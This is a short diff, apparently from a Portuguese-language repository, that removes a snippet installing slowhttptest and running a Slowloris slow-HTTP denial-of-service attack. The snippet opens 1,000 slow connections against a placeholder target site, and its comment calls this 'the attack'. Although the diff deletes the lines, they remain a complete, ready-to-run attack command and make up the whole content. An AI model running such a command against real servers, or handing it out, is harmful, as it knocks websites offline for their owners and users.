@@ -1,5 +1,0 @@
-# Instale o slowhttptest (se não tiver):
-sudo apt update && sudo apt install slowhttptest -y
-
-# Execute o ataque (exemplo: 1.000 conexões lentas em 60 segundos)
-slowhttptest -c 1000 -H -g -o slowloris -i 10 -r 200 -t GET -u http://site-alvo.com
